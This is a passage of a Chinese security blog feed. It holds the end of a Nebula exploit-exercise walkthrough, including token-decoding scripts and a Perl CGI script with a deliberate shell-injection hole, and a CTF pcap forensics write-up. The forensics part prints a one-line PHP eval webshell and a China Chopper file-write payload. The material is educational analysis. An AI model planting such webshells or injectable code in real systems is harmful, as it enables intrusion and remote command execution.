src="https://upload-images.jianshu.io/upload_images/5443560-76e63267a2c50648.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><code>Application</code>输要调试程序在服务器上的绝对路径。<br><code>Diresctory</code> 输所在的路径<br><code>Host</code> 输服务器的IP<br>跟OD基本一样了，F2在main函数下个断点，然后单步调试<br><img src="https://upload-images.jianshu.io/upload_images/5443560-4f09ec4a8d99b13e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>执行到<code>080484F9</code>处，<br><img src="https://upload-images.jianshu.io/upload_images/5443560-a48742e20d61da5d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>这里面的判断正是<code>if(getuid() != FAKEUID)</code>这个判断，通过修改zf标志位改变执行流程。在服务器端输出token 的值用于登陆<br><img src="https://upload-images.jianshu.io/upload_images/5443560-298de17773e2bd71.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>第二种方法是通过IDA静态查看代码，手动计算token的值<br>利用F5插件，查看类C代码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">__uid_t</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+28h] [ebp-110h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+2Ch] [ebp-10Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v8; <span class="comment">// [esp+12Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( getuid() != <span class="number">1000</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = getuid();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Security failure detected. UID %d started us, we expect %d\n"</span>, v3, <span class="number">1000</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"The system administrators will be notified of this violation"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v7, <span class="number">0</span>, <span class="number">0x100</span>u);</span><br><span class="line">  <span class="built_in">strcpy</span>(&amp;v7, <span class="string">"8mjomjh8wml;bwnh8jwbbnnwi;&gt;;88?o;9ob"</span>);</span><br><span class="line">  v4 = *(_DWORD *)<span class="string">";9ob"</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; *((_BYTE *)&amp;v7 + i); ++i )</span><br><span class="line">    *((_BYTE *)&amp;v7 + i) ^= <span class="number">0x5A</span>u;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"your token is %s\n"</span>, &amp;v7);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>关键在<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">memset(&amp;v7, 0, 0x100u);</span><br><span class="line">strcpy(&amp;v7, &quot;8mjomjh8wml;bwnh8jwbbnnwi;&gt;;88?o;9ob&quot;);</span><br><span class="line">v4 = *(_DWORD *)&quot;;9ob&quot;;</span><br><span class="line">for ( i = 0; *((_BYTE *)&amp;v7 + i); ++i )</span><br><span class="line">  *((_BYTE *)&amp;v7 + i) ^= 0x5Au;</span><br><span class="line">return printf(&quot;your token is %s\n&quot;, &amp;v7);</span><br></pre></td></tr></table></figure></p><p>这里面V7的值就是token 。我使用python 计算<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Date    : 2018-06-07 19:13:48</span></span><br><span class="line"><span class="comment"># @Author  : daiker (daikersec@gmail.com)</span></span><br><span class="line"><span class="comment"># @Link    : http://daikersec.com</span></span><br><span class="line"><span class="comment"># @Version : $Id$</span></span><br><span class="line"></span><br><span class="line">token = <span class="string">"8mjomjh8wml;bwnh8jwbbnnwi;&gt;;88?o;9ob"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span>.join([chr(ord(i)^<span class="number">0x5A</span>) <span class="keyword">for</span> i <span class="keyword">in</span> token])</span><br></pre></td></tr></table></figure></p><p>得到token <img src="https://upload-images.jianshu.io/upload_images/5443560-594ecec88edc3427.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h2 id="0x0F-level14"><a href="#0x0F-level14" class="headerlink" title="0x0F level14"></a>0x0F level14</h2><blockquote><p>This program resides in /home/flag14/flag14. It encrypts input and writes it to standard output. An encrypted token file is also in that home directory, decrypt it :)</p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/5443560-f39225877ed23dc8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>是个加密程序，利用IDA来看下加密算法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">int __cdecl __noreturn main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  bool v3; // cf</span><br><span class="line">  bool v4; // zf</span><br><span class="line">  signed int v5; // ecx</span><br><span class="line">  const char *v6; // esi</span><br><span class="line">  _BYTE *v7; // edi</span><br><span class="line">  int v8; // [esp+2Ch] [ebp-5Ch]</span><br><span class="line">  signed int i; // [esp+30h] [ebp-58h]</span><br><span class="line">  signed int v10; // [esp+34h] [ebp-54h]</span><br><span class="line">  char buf[64]; // [esp+3Ch] [ebp-4Ch]</span><br><span class="line">  unsigned int v12; // [esp+7Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v12 = __readgsdword(0x14u);</span><br><span class="line">  v8 = 0;</span><br><span class="line">  if ( argc &lt;= 1 )</span><br><span class="line">    goto LABEL_17;</span><br><span class="line">  v3 = __CFADD__(argv, 4);</span><br><span class="line">  v4 = argv + 1 == 0;</span><br><span class="line">  v5 = 3;</span><br><span class="line">  v6 = argv[1];</span><br><span class="line">  v7 = &amp;unk_8048660;</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    if ( !v5 )</span><br><span class="line">      break;</span><br><span class="line">    v3 = (const unsigned __int8)*v6 &lt; *v7;</span><br><span class="line">    v4 = *v6++ == *v7++;</span><br><span class="line">    --v5;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( v4 );</span><br><span class="line">  if ( (!v3 &amp;&amp; !v4) != v3 )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_17:</span><br><span class="line">    printf(&quot;%s\n\t-e\tEncrypt input\n&quot;, *argv);</span><br><span class="line">    exit(1);</span><br><span class="line">  &#125;</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = read(0, buf, 0x40u);</span><br><span class="line">    if ( v10 &lt;= 0 )</span><br><span class="line">      break;</span><br><span class="line">    for ( i = 0; i &lt; v10; ++i )</span><br><span class="line">      buf[i] += v8++;</span><br><span class="line">    if ( write(1, buf, v10) &lt;= 0 )</span><br><span class="line">      exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  exit(0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>核心加密在</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = read(0, buf, 0x40u);</span><br><span class="line">    if ( v10 &lt;= 0 )</span><br><span class="line">      break;</span><br><span class="line">    for ( i = 0; i &lt; v10; ++i )</span><br><span class="line">      buf[i] += v8++;</span><br><span class="line">    if ( write(1, buf, v10) &lt;= 0 )</span><br><span class="line">      exit(0);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>就是将每个字节的ASCII加上0,1,2,3这样，用python 写个解密算法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Date    : 2018-06-07 19:53:26</span></span><br><span class="line"><span class="comment"># @Author  : daiker (daikersec@gmail.com)</span></span><br><span class="line"><span class="comment"># @Link    : http://daikersec.com</span></span><br><span class="line"><span class="comment"># @Version : $Id$</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"token"</span>,<span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">order = <span class="number">0</span></span><br><span class="line">token = <span class="string">""</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">data = f.read(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">token += chr(ord(data)-order)</span><br><span class="line">order += <span class="number">1</span></span><br><span class="line"><span class="keyword">print</span> token</span><br></pre></td></tr></table></figure><p>token为<img src="https://upload-images.jianshu.io/upload_images/5443560-5b493df2ecca5a4b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h2 id="0x10level15"><a href="#0x10level15" class="headerlink" title="0x10level15"></a>0x10level15</h2><blockquote><p><a href="http://linux.die.net/man/1/strace" target="_blank" rel="noopener">strace</a> the binary at <strong>/home/flag15/flag15</strong> and see if you spot anything out of the ordinary.You may wish to <a href="http://www.google.com.au/search?q=compile%20shared%20library%20linux" target="_blank" rel="noopener">review</a> how to “compile a shared library in linux” and how the libraries are loaded and processed by reviewing the <strong>dlopen</strong> manpage in depth.<br>Clean up after yourself :)</p></blockquote><h2 id="0x11-level16"><a href="#0x11-level16" class="headerlink" title="0x11 level16"></a>0x11 level16</h2><blockquote><p>There is a perl script running on port 1616.</p></blockquote><p>源码<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env perl</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> CGI <span class="string">qw&#123;param&#125;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Content-type: text/html\n\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">login</span> </span>&#123;</span><br><span class="line">  $username = $_[<span class="number">0</span>];</span><br><span class="line">  $password = $_[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  $username =~ <span class="regexp">tr/a-z/A-Z/</span>; <span class="comment"># conver to uppercase</span></span><br><span class="line">  $username =~ <span class="regexp">s/\s.*//</span>;        <span class="comment"># strip everything after a space</span></span><br><span class="line"></span><br><span class="line">  @output = <span class="string">`egrep "^$username" /home/flag16/userdb.txt 2&gt;&amp;1`</span>;</span><br><span class="line">  <span class="keyword">foreach</span> $line (@output) &#123;</span><br><span class="line">      ($usr, $pw) = <span class="keyword">split</span>(<span class="regexp">/:/</span>, $line);</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>($pw =~ $password) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">htmlz</span> </span>&#123;</span><br><span class="line">  <span class="keyword">print</span>(<span class="string">"&lt;html&gt;&lt;head&gt;&lt;title&gt;Login resuls&lt;/title&gt;&lt;/head&gt;&lt;body&gt;"</span>);</span><br><span class="line">  <span class="keyword">if</span>($_[<span class="number">0</span>] == <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">print</span>(<span class="string">"Your login was accepted&lt;br/&gt;"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">print</span>(<span class="string">"Your login failed&lt;br/&gt;"</span>);</span><br><span class="line">  &#125;    </span><br><span class="line">  <span class="keyword">print</span>(<span class="string">"Would you like a cookie?&lt;br/&gt;&lt;br/&gt;&lt;/body&gt;&lt;/html&gt;\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">htmlz(login(param(<span class="string">"username"</span>), param(<span class="string">"password"</span>)));</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-Nebula介绍和玩法&quot;&gt;&lt;a href=&quot;#0x00-Nebula介绍和玩法&quot; class=&quot;headerlink&quot; title=&quot;0x00 Nebula介绍和玩法&quot;&gt;&lt;/a&gt;0x00 Nebula介绍和玩法&lt;/h2&gt;&lt;p&gt;Nebula 是# &lt;a href=&quot;https://exploit-exercises.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Exploit Exercises &lt;/a&gt;上的基础关&lt;br&gt;他涉及了基本的&lt;code&gt;源码级漏洞分析&lt;/code&gt;、&lt;code&gt;提权&lt;/code&gt;。可以通过官网下载镜像进行安装。&lt;br&gt;每一关都对应系统中以level开头的账号，密码与账号名相同（比如&lt;code&gt;Level01&lt;/code&gt;,对应的系统帐号是&lt;code&gt;level0&lt;/code&gt;1），每玩一关，都需要用对应的账号登录系统，然后进入到&lt;code&gt;/home/flag×&lt;/code&gt;目录中，与该level相关的代码、数据等都放在于此。之后通过运行getflag 来验证是否提权成功&lt;/p&gt;
&lt;h2 id=&quot;0x01-level00&quot;&gt;&lt;a href=&quot;#0x01-level00&quot; class=&quot;headerlink&quot; title=&quot;0x01 level00&quot;&gt;&lt;/a&gt;0x01 level00&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;This level requires you to find a Set User ID program that will run as the “flag00” account. You could also find this by carefully looking in top level directories in / for suspicious looking directories.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;查找suid的程序，直接通过find查找&lt;br&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="http://www.daikersec.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="提权" scheme="http://www.daikersec.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%8F%90%E6%9D%83/"/>
    
      <category term="Linux" scheme="http://www.daikersec.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%8F%90%E6%9D%83/Linux/"/>
    
    
      <category term="Linux" scheme="http://www.daikersec.com/tags/Linux/"/>
    
      <category term="提权" scheme="http://www.daikersec.com/tags/%E6%8F%90%E6%9D%83/"/>
    
      <category term="渗透测试" scheme="http://www.daikersec.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>铁人三项2018第七赛区(福建)数据赛wp</title>
    <link href="http://www.daikersec.com/wiki/ba9a968.html"/>
    <id>http://www.daikersec.com/wiki/ba9a968.html</id>
    <published>2018-05-15T13:44:37.000Z</published>
    <updated>2018-05-21T03:03:47.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-题目"><a href="#0x00-题目" class="headerlink" title="0x00 题目"></a>0x00 题目</h1><p>链接:<a href="https://pan.baidu.com/s/109nbU4x0t-IXHaP_vBLuaw" target="_blank" rel="noopener">密码：0ple</a><br>题目:<a href="https://pan.baidu.com/s/1oq-wH7kT805wvi0a7v6RPA" target="_blank" rel="noopener">密码：ngkm</a></p><a id="more"></a><h1 id="0x01-写webshell"><a href="#0x01-写webshell" class="headerlink" title="0x01 写webshell"></a>0x01 写webshell</h1><p>先通过httppcap 提取出http浏览<br>脚本如下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> `ls`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    parse_pcap -vvv <span class="variable">$file</span> &gt; content/<span class="variable">$file</span>.txt</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure></p><p><img src="https://upload-images.jianshu.io/upload_images/5443560-f3ac4605b2b46b38.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>第一关是<code>关卡描述：网站后台密码是多少</code><br>这里制作一个匹配脚本，后面用的到<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> `ls`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$file</span></span><br><span class="line">    cat <span class="variable">$file</span>|grep <span class="variable">$1</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"-----------------------------------------------------"</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure></p><p>执行<code>./1.sh pass</code><br>发现大量爆破<br><img src="https://upload-images.jianshu.io/upload_images/5443560-75b68180138f35c4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>接下来匹配<code>./1.sh &quot;&amp;password=&quot;</code><br>尝试下查看下最后一个爆破的回包<code>username=admin&amp;password=aabbcc</code><br>在<br><img src="https://upload-images.jianshu.io/upload_images/5443560-c083326bfd6e0884.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>结合<code>302</code>，<code>location</code>，<code>set-Cookie</code>可以看出这个已经爆破成功，所以第一题<code>关卡描述：网站后台密码是多少</code>是<code>aabbcc</code>。攻击者IP是<code>202.1.1.2</code>。<br>接下来看第三题。<code>网站后台登陆地址是多少（http://+ip+路径）</code><br>找到一个爆破的包，有这么几行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[202.1.1.2:15717] -- -- --&gt; [192.168.1.203:80] </span><br><span class="line">POST /ad_admin.php?mod=login HTTP/1.1</span><br><span class="line">Host: 202.1.1.1</span><br></pre></td></tr></table></figure></p><p>我就填了<code>http://202.1.1.1/ad_admin.php</code>结果不行，后来填了<br><code>http://192.168.1.203/ad_admin.php</code>，答案正确，我觉得应该是第一个更贴切。<br>接下来的问题是找<code>webshell</code>。我通过匹配菜刀连接特征寻找猜到痕迹。<br><img src="https://upload-images.jianshu.io/upload_images/5443560-fa3c58ad953c5501.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>在<code>data-sence2_00003_20180204180642.pcapng.txt</code>里面,向前看，在第一个<code>shell2.php</code>前面，爆破成功后面<br>找到这句话<br><img src="https://upload-images.jianshu.io/upload_images/5443560-c58ca9fe78481fce.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>解码得到<br><code>$fp = fopen(&quot;shell2.php&quot;, &quot;w&quot;);fwrite($fp, &quot;&lt;?php eval(\$_POST[&#39;cmd&#39;]);?&gt;&quot;);fclose($fp);</code><br>所以webshell的内容是<br><code>&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;</code><br>接下来从第五题开始分析的是菜刀里面的内容</p><h1 id="0x02-菜刀内容"><a href="#0x02-菜刀内容" class="headerlink" title="0x02 菜刀内容"></a>0x02 菜刀内容</h1><p><code>5. 关卡描述：网站数据库密码是多少</code><br>在<code>data-sence2_00007_20180204183072.pcapng.txt</code>里面<br><img src="https://upload-images.jianshu.io/upload_images/5443560-0eee457199c56056.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>所以密码是<code>newnrtpassword</code><br><code>6. 黑客第一个上传的php文件名是什么</code><br>在<code>data-sence2_00005_20180204181416.pcapng</code>里面<br><img src="https://upload-images.jianshu.io/upload_images/5443560-9d42f1f49c600c49.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>解码为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);if(PHP_VERSION&lt;&apos;5.3.0&apos;)&#123;@set_magic_quotes_runtime(0);&#125;;echo(&quot;X@Y&quot;);$f=&apos;/var/www/html/diypage/scan.php&apos;;$c=$_POST[&quot;z1&quot;];$c=str_replace(&quot;\r&quot;,&quot;&quot;,$c);$c=str_replace(&quot;\n&quot;,&quot;&quot;,$c);$buf=&quot;&quot;;for($i=0;$i&lt;strlen($c);$i+=2)$buf.=urldecode(&apos;%&apos;.substr($c,$i,2));echo(@fwrite(fopen($f,&apos;w&apos;),$buf)?&apos;1&apos;:&apos;0&apos;);;echo(&quot;X@Y&quot;);die();</span><br></pre></td></tr></table></figure></p><p>所以结果为<code>scan.php</code><br><code>7. 关卡描述：黑客对内网扫描的范围是多少(ip1-ip2)</code><br>结合上面的<code>scan.php</code>，应该是通过scan.php来匹配的。我们匹配下<br><code>./1.sh  scan.php</code><br><img src="https://upload-images.jianshu.io/upload_images/5443560-ab03c1a646f06531.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>在<code>data-sence2_00005_20180204181416.pcapng</code>里面<br><img src="https://upload-images.jianshu.io/upload_images/5443560-b9f384e7f0c4084b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>是从<code>192.168.2.1</code>到<code>192.168.2.150</code><br><code>8. 描述：黑客下载的数据库备份文件名是什么</code><br>匹配<code>./1.sh  bak</code><br><img src="https://upload-images.jianshu.io/upload_images/5443560-0c3449dc2554f7c5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>所以是<code>bak_2018-01-29-17-47-52.zip</code><br><code>9. 关卡描述：黑客上传的图片木马的密码是多少</code><br>用<code>./1.sh  &#39;array_map(&quot;ass&quot;.&quot;ert&quot;,array&#39;</code>匹配菜刀内容，图片应该post的包是蛮大的。总共比较大的就几个。然后一个个解码，根据文件名，找到<code>favicon.ico&#39;</code><br><img src="https://upload-images.jianshu.io/upload_images/5443560-00b33027f7750edc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p><p>在<code>data-sence2_00007_20180204183702.pcapng</code>里面<br><img src="https://upload-images.jianshu.io/upload_images/5443560-a639984bfb7a3999.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p><p>拖进winhex<br><img src="https://upload-images.jianshu.io/upload_images/5443560-02121bc64f3566d6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>所以图片马的密码是 <code>picto</code><br><code>10. 黑客修改了哪个文件来配合木马文件(绝对路径)</code><br>上面传的是图片马，不能直接利用，要配合使用，应该 是利用文件包含<br>先过滤菜刀，再过滤include<br><code>./1.sh  &#39;array_map(&quot;ass&quot;.&quot;ert&quot;,array&#39;|grep include</code><br><img src="https://upload-images.jianshu.io/upload_images/5443560-aaac5eb8698492d4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>在这里面看到<code>include%28..%2Ffavicon.ico</code><br>解码，得到文件名为<code>/var/www/html/diypage/adm/obj_edit.php</code><br>接下来的操作都是通过tunnel代理</p><h1 id="0x03-web代理"><a href="#0x03-web代理" class="headerlink" title="0x03 web代理"></a>0x03 web代理</h1><p><code>11 关卡描述：FTP服务器开在了哪个端口</code><br><code>reGeorg</code>这个工具常用于web代理，查找端口我们可以直接利用<br><code>./1.sh  &#39;?cmd=connect&amp;target=&#39;</code>过滤，查找到有<br><code>1433</code>，<code>10062</code>，<code>10063</code>三个端口，我们一个个过滤(比赛的时候懒得过滤，有5次提交机会，所以一个个试，是1433).通过wireshark<br>过滤<code>tcp.port == 1433 || udp.port == 1433</code><br>追踪流可以看到ftp登录，因此就是他了<br><img src="https://upload-images.jianshu.io/upload_images/5443560-c105bd4442dd2e2a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br><code>12 黑客使用FTP上传的文件名</code><br>追踪1433的流，发现大量登录爆破，在成功的那个流里面<br><img src="https://upload-images.jianshu.io/upload_images/5443560-40dbb31a9fa3f4a6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>文件名是<code>readmd.rtf</code><br><code>13 黑客登陆FTP的密码是多少</code><br>也是在这个流里面<br><img src="https://upload-images.jianshu.io/upload_images/5443560-8805e68ac70138c4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>密码是<code>qweasd123!@#</code><br><code>14. 黑客使用FTP上传的文件中的文件内容是什么</code><br>在这个<img src="https://upload-images.jianshu.iso/upload_images/5443560-9da6c2e8697396a4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="">的中间寻找流，刚好在226上面那条<br><img src="https://upload-images.jianshu.io/upload_images/5443560-0afe48938d69421f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-题目&quot;&gt;&lt;a href=&quot;#0x00-题目&quot; class=&quot;headerlink&quot; title=&quot;0x00 题目&quot;&gt;&lt;/a&gt;0x00 题目&lt;/h1&gt;&lt;p&gt;链接:&lt;a href=&quot;https://pan.baidu.com/s/109nbU4x0t-IXHaP_vBLuaw&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;密码：0ple&lt;/a&gt;&lt;br&gt;题目:&lt;a href=&quot;https://pan.baidu.com/s/1oq-wH7kT805wvi0a7v6RPA&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;密码：ngkm&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
